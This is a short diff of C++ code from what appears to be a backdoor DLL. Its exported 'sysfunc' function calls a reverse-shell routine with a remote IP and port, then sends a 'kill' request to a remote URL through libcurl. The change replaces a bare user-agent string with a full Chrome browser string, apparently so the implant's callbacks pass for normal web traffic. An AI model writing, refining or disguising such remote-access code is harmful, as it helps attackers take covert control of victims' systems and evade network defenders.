@@ -228,7 +228,7 @@ extern "C" DLLIMPORT void sysfunc()
 				frevshell(sip.c_str(), sport.c_str());
 				surlkill = surl; surlkill.append("&kill=1");
 				curl_easy_setopt(curl_handle, CURLOPT_URL, surlkill.c_str());
-				curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
+				curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36");
 				res = curl_easy_perform(curl_handle);
 			}
 		}
